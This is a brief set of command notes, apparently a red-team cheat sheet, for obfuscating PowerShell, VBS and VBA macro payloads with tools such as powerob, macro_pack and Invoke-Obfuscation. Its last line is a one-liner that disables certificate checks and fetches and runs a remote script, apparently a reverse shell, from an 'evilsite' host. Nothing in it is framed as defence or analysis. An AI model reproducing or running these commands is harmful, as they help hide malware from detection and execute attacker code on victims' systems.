```
python3 powerob.py obfuscate originalfile.ps1 obfuscatedfile.ps1
python3 obfuscate.py orgi.vbs --output /tmp/obfuscate.vba
```

```
./src/macro_pack.py  -f ./delivery.vba -o -G macro_obf.vba
SetExecutionPolicy remotesigned
Import-Module ./Invoke-Obfuscation.psd1
Invoke-Obfuscation
set scriptblock IEX '[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}'; IEX (New-Object Net.WebClient).DownloadString('https://my.evilsite/revc.ps1')
```
